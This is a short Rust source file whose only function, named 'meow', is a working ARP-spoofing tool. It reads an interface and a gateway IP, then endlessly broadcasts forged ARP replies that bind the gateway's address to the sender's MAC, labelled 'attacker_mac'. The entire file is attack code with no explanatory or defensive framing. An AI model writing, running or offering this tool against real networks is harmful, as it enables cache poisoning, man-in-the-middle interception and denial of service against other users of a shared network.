use pnet::datalink::{self, Channel::Ethernet, MacAddr};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use std::io::stdin;
use std::net::Ipv4Addr;
pub(crate) fn meow() {
    let mut iface_name = String::new();
    stdin()
        .read_line(&mut iface_name)
        .expect("Failed to read line");
    iface_name = iface_name.trim().to_string();
    let mut gateway_ip = String::new();
    stdin()
        .read_line(&mut gateway_ip)
        .expect("Failed to read line");
    gateway_ip = gateway_ip.trim().to_string();
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|i| i.name == iface_name)
        .unwrap();
    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, _)) => (tx, ()),
        _ => panic!("Failed to open datalink channel"),
    };
    let attacker_mac = interface.mac.unwrap();
    loop {
        let mut arp_buffer = [0u8; 28];
        let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Reply);
        arp_packet.set_sender_hw_addr(attacker_mac);
        arp_packet.set_sender_proto_addr(gateway_ip.parse().unwrap());
        arp_packet.set_target_hw_addr(MacAddr::broadcast());
        arp_packet.set_target_proto_addr(Ipv4Addr::new(0, 0, 0, 0));
        let mut ethernet_buffer = [0u8; 42];
        let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
        ethernet_packet.set_destination(MacAddr::broadcast());
        ethernet_packet.set_source(attacker_mac);
        ethernet_packet.set_ethertype(EtherTypes::Arp);
        ethernet_packet.set_payload(arp_packet.packet_mut());
        tx.send_to(ethernet_packet.packet(), None);
    }
}